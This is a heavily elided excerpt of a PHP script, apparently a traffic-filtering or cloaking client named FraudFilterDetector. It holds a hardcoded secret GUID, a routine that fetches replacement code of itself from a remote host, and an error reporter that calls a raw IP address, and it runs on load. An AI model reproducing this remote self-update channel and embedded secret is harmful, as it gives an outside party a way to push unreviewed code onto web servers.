...
class FraudFilterDetector_oqroe {
    ...
    function isSignatureValid($sign, $time) {
        $str = '75e7f7c0-ed68-4d88-b2ec-a6b9b65b43f9.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 75e7f7c0-ed68-4d88-b2ec-a6b9b65b43f9',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 75e7f7c0-ed68-4d88-b2ec-a6b9b65b43f9';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 75e7f7c0-ed68-4d88-b2ec-a6b9b65b43f9';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=oqroe&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_oqroe = new FraudFilterDetector_oqroe();
$fraudFilterDetector_oqroe->check();
